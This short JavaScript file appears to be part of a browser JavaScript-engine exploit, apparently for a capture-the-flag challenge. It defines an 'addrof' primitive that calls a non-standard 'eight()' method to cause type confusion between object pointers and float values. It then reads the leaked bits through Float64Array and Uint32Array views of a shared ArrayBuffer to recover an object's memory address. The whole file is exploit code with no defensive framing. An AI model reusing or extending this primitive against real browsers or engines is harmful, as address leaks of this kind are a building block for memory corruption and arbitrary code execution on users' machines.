let bytes = new ArrayBuffer(1000);
let floatview = new Float64Array(bytes);
let bitview = new Uint32Array(bytes);

let addrof = function(obj){
    let first = {"int" : 420, "object" : obj};
    first.eight();
    let second = {"val" : first.int, "floattag" : 7};
    // shift the second value plane
    // suddenly, value of thing is now tagged with a float!
    second.eight();
    // translation
    floatview[0] = second.val;
    // reshift to not corrupt pointers
    first.eight();
    second.eight();
    // u32[1] = top bits
    // u32[0] = bottom bits
    // convert hex address to decimal number
    //return parseFloat(Number("0x" + u32[1].toString(16) + u32[0].toString(16)));
    return (bitview[1] * (1 << 16) * (1 << 16)) + bitview[0];
};
